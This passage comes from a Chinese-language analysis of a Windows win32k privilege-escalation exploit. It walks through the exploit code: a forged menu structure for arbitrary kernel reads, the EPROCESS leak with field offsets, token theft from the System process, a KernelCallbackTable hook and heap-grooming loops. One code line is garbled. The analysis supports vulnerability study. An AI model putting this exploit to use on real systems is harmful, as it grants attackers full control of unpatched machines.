            0x5C Window Rect top
        0x90 spMenu(tagMENU *)
            0x00 hMenu
            0x28 unknown1
                0x2C cItems(for check)
            0x40 unknown2(for check)
            0x44 unknown3(for check)
            0x58 rgItems
                0x00 unknown(for exploit)
            0x98 spMenuk
                0x00 pSelf
需要注意， **spMenu- >spMenuk->pSelf 是一个指向 spMenu 自身的指针**。
分析 xxxGetMenuBarInfo 关键部分：
95 行的等号重载：
可以得出分割线往上检查了：
  * 1.对于 GetMenuBarInfo 参数 
    * 87 行：第二个参数 idObject 应为 -3
    * 98、99 行：0 spMenu->unknown1->cItems
  * 2.对于 tagWNDk 结构体 
    * 89 行：dwStyle 不能包含 WS_CHILD 属性
  * 3.对于 tagMENU 结构体 
    * 105 行：unknown2 与 unknown3 不能为 0
分割线往下就是利用部分了，由 110 – 112、122 – 130、159 行可知，如果伪造的 tagMENU 结构体中 rgItems->unknown
为 **欲读取的地址 – 0x40** ，那么就能从 GetMenuBarInfo 第四个参数 pmbi 获得欲读取地址开始的 16
个字节（当然还需要减去一些已知值）。因此，我们需要伪造的 tagMENU 结构体长这样：
构造好了怎么修改 ptagWND->spMenu 呢？Kernel Killer 在他的 EXP 中选择使用 SetWindowLongPtr
自带的功能来修改。其实 SetWindowLong 系列函数除了能写窗口附加空间， **如果参数 nIndex 给的是负数，它们还能用于设置 tagWND
的一些字段** ，这些功能都是公开的，可以在微软开发文档[17] 查到：
当 nIndex 为 GWLP_ID 时，win32kfull!xxxSetWindowLongPtr 还会调用
**win32kfull!xxxSetWindowData** ，在其中设置 ptagWND->spMenu 为用户给定的值，并 **返回 spMenu
旧值** （ **注意：dwStyle 应带有 WS_CHILD 属性** ）：
就算不知道 SetWindowLongPtr 有这样的功能，也能改到 ptagWND->spMenu。同 **3.6.1 节** 的理，对窗口 0 调用
SetWindowLongPtr，通过越界写同样能将窗口 1 的 tagWNDk.spMenu 改为自定义的值，这种情况下，SetWindowLongPtr
依旧会返回修改前的旧值：
无论使用哪种方式，现在我们获得了任意地址读的能力！
> 3.6.3 泄露内核对象地址
泄露地址的工作在上一部分已经完成了一半 —— 泄露出了旧 spMenu 的地址，由 **3.2 节** 又有：
    ptagWND(user layer)
        0x10 unknown
            0x00 pTEB
                0x220 pEPROCESS(of current process)
        0x90 spMenu
            0x18 unknown0
                0x100 unknown
                    0x00 pEPROCESS(of current process)
            0x50 ptagWND
那么泄露当前进程 EPROCESS 地址的方式就不止一种了：
  * 1.通过三次任意地址读，达到 `**(__int64 **)(*(__int64 *)(spMenu + 0x18) + 0x100)` 的效果（EXP 使用）
  * 2.通过四次任意地址读，达到 `*(__int64 *)(**(__int64 **)(*(__int64 *)(spMenu + 0x50) + 0x10) + 0x220)` 的效果（攻击样本使用）
> 3.6.4 提升进程权限
知道当前进程的 EPROCESS 地址后，遍历 EPROCESS->ActiveProcessLinks 链表[18]，找到 pid 为 4
的进程（System 进程），将其 Token 复制到当前的攻击进程，即可完成提权。
下面是将用到的 EPROCESS 字段及其偏移量：
    pEPROCESS
        0x2E0 UniqueProcessId            // pid
        0x2E8 ActiveProcessLinks.Flink    // 该字段指向下一个 EPROCESS 结构体的 ActiveProcessLinks（双向链表）
        0x358 Token                        // 令牌
* * *
## 04 EXP 阅读
这个部分我将按照 EXP 的程序执行流，把 **03 部分** 完整地串起来，各个技术点的实施细节将在这里展露无遗。
###  4.1 准备工作
169 – 176 行（WinMain 入口）为本窗口程序创建了一个控制台，并将程序的标准输入、输出重定向到这个控制台，这就是为什么运行 EXP
时会有个命令行界面：
    UNREFERENCED_PARAMETER(hPrevInstance);    // 告诉编译器，已经使用了参数，不必警告
    UNREFERENCED_PARAMETER(lpCmdLine);        // 应该是创建项目时的模板代码
    AllocConsole();        // 创建一个控制台
    FILE* tempFile = nullptr;
    freopen_s(&tempFile, "conin$", "r+t", stdin);        // 重定向程序的标准输入到控制台
    freopen_s(&tempFile, "conout$", "w+t", stdout);        // 重定向程序的标准输出到控制台
178 – 187 行通过未公开的 ntdll!RtlGetNtVersionNumbers 函数获得 Windows 版本信息（主次版本及 OS
内部版本号），并输出到控制台：
    typedef void(WINAPI* FRtlGetNtVersionNumbers)(DWORD*, DWORD*, DWORD*);
    DWORD dwMajorVer, dwMinorVer, dwBuildNumber = 0;
    FRtlGetNtVersionNumbers fRtlGetNtVersionNumbers = (FRtlGetNtVersionNumbers)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetNtVersionNumbers");
    fRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);    // 获得版本信息
    dwBuildNumber &= 0x0ffff;
    std::cout > 16 ^ 0xffff) * 0x10000) );    // 计算得到 user32!HMValidateHandle 地址
                    break;
                }
            }
        }
        return *pfOutHMValidateHandle != NULL ? true : false;
    }
200 – 204 行将 KernelCallbackTable 的 123、124 项替换成自己的挂钩函数：
    DWORD dwOldProtect = 0;
    VirtualProtect((PBYTE)pKernelCallbackTable + 0x3D8, 0x400, PAGE_EXECUTE_READWRITE, &dwOldProtect);        // 给 KernelCallbackTable 所在的内存添加可写权限
    *(ULONG_PTR*)((PBYTE)pKernelCallbackTable + 0x3D8) = (ULONG_PTR)MyxxxClientAllocWindowClassExtraBytes;    // hook 123 项
    *(ULONG_PTR*)((PBYTE)pKernelCallbackTable + 0x3E0) = (ULONG_PTR)MyxxxClientFreeWindowClassExtraBytes;    // hook 124 项，调试用
    VirtualProtect((PBYTE)pKernelCallbackTable + 0x3D8, 0x400, dwOldProtect, &dwOldProtect);    // 还原内存权限
第 123 项的 hook 函数等到下面用到时再贴出来。第 124 项的 hook 应该是作者为了调试 EXP 而加的，其 hook
函数原封不动地调用了原函数：
    NTSTATUS WINAPI MyxxxClientFreeWindowClassExtraBytes(PVOID pInfo)
    {
        PVOID pAddress = *(PVOID*)((PBYTE)pInfo + 8);
        return g_fxxxClientFreeWindowClassExtraBytes(pInfo);    // 调用原函数
    }
###  4.2 内存布局
206 – 221 行注册了两个窗口类，两个窗口类的主要区别是 cbWndExtra 的大小：
    ATOM atom1, atom2 = 0;
    WNDCLASSEX WndClass = { 0 };
    WndClass.cbSize = sizeof(WNDCLASSEX);
    WndClass.lpfnWndProc = DefWindowProc;    // 使用默认窗口过程
    WndClass.style = CS_VREDRAW| CS_HREDRAW;
    WndClass.cbWndExtra = 0x20;                // Class1 窗口扩展内存的大小为 0x20
    WndClass.hInstance = hInstance;
    WndClass.lpszMenuName = NULL;
    WndClass.lpszClassName = L"Class1";        // 窗口类名为 Class1
    atom1 = RegisterClassEx(&WndClass);     // 注册 Class1
    WndClass.cbWndExtra = g_dwMyWndExtra;    // Class2 窗口扩展内存的大小为 0x1234
    WndClass.hInstance = hInstance;
    WndClass.lpszClassName = L"Class2";        // 窗口类名为 Class2
    atom2 = RegisterClassEx(&WndClass);        // 注册 Class2
223 – 287 行通过创建/销毁窗口，正式进行内核桌面堆布局：
    ULONG_PTR dwpWnd0_to_pWnd1_kernel_heap_offset = 0;
    for (int nTry = 0; nTry < 5; nTry++) {    // 最多尝试 5 次内存布局
        HMENU hMenu = NULL;
        HMENU hHelpMenu = NULL;
        // 创建 50 个窗口
        for (int i = 0; i < 50; i++) {
            if (i == 1) {    // i = 1 时创建一个菜单 hMenu
                hMenu = CreateMenu();
                hHelpMenu = CreateMenu();
                AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));    // 准备一个 Item
                AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));    // 为菜单添加 Item
            }
            g_hWnd[i] = CreateWindowEx(NULL, L"Class1", NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, hMenu, hInstance, NULL);    // 创建窗口，只有窗口 0 没有菜单
            g_pWnd[i] = (ULONG_PTR)fHMValidateHandle(g_hWnd[i], 1); // 泄露每个窗口 tagWNDk 在用户空间的映射指针
        }
        // 销毁掉后 48 个窗口，使它们 tagWNDk 占用的桌面堆块处于空闲状态，再创建窗口时很有可能再用到这些空闲的堆块
        for (int i = 2; i < 50; i++) {
            if (g_hWnd[i] != NULL) {
                DestroyWindow((HWND)g_hWnd[i]);
            }
        }
        // ptagWNDk + 8 保存了 tagWNDk 相对于桌面堆基址的偏移
        g_dwpWndKernel_heap_offset0 = *(ULONG_PTR*)((PBYTE)g_pWnd[0] + g_dwKernel_pWnd_offset);
        g_dwpWndKernel_heap_offset1 = *(ULONG_PTR*)((PBYTE)g_pWnd[1] + g_dwKernel_pWnd_offset);
        // 对窗口 0 调用 ConsoleControl，使其 pExtraBytes 处于 offset 间接寻址模式